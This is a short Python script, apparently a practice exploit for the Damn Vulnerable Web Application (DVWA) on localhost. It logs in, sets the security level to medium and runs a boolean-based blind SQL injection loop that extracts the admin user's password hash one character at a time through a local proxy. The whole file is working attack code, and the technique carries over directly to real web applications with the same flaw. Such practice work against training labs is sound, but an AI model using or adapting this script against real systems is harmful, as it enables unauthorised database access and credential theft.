#!/usr/bin/python3

import requests
import re

url='http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/'

login='http://127.0.0.1/dvwa/login.php'
security='http://127.0.0.1/dvwa/security.php'

username='admin'
password='password'

session=requests.session()
r=session.get(login)

token=re.search("value=.*'",r.text).group(0)
user_token=token.split('=')[1].strip("'")

postdata={'username':username,'password':password,'Login':'Login','user_token':user_token}
proxy={'http':'http://127.0.0.1:8080'}
secdata={'security':'medium','seclev_submit':'Submit','user_token':user_token}
p=session.post(login,data=postdata,proxies=proxy)
secu=session.post(security,data=secdata,proxies=proxy)



#for ascii character 0-9a-f
dec = 48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102

extract=""
for number in range(1,33):
    for ch in dec:
        #change the ascii character
        payload="1 AND (select ascii(substr((select password from users where user_id=1),"+str(number)+",1))="+str(ch)+")"

        #for post request data
        data_a = {"id":payload,"Submit":"Submit"}
        
        sql=session.post(url,data_a,proxies=proxy)
        exist=re.search("User ID exists in the database.",sql.text)
        if exist:
            extract+=chr(ch) #change decimal to char with chr() function 
            print("Password is:"+extract)
            break
